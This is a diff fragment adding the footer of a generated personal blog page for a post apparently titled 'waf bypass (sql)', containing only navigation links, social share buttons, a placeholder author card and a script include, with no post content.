+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2022/02/25/20220225/"
+                    data-tooltip="内网安全之kerberos(二)"
+                    aria-label="下一篇: 内网安全之kerberos(二)"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/06/20/20220620/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/06/20/20220620/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/06/20/20220620/&amp;title=waf bypass (sql)"
+                    title="分享到 QQ"
+                    aria-label="分享到 QQ"
+                >
+                    <i class="fab fa-qq" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/06/20/20220620/"
+                        aria-label="分享到 Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=https://self209.github.io/2022/06/20/20220620/"
+                        aria-label="分享到 Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/06/20/20220620/&amp;title=waf bypass (sql)"
+                        aria-label="分享到 QQ"
+                    >
+                        <i class="fab fa-qq" aria-hidden="true"></i><span>分享到 QQ</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <h4 id="about-card-name">self_209</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+
+<script src="/assets/js/script-xim376viwh5lr12gw0yeibdthi5jv6dbtso7hirh0xa2nvwxpntwvib0dgwh.min.js"></script>
+
+<!--SCRIPTS END-->
+
+
+
+
+
+    </body>
+</html>
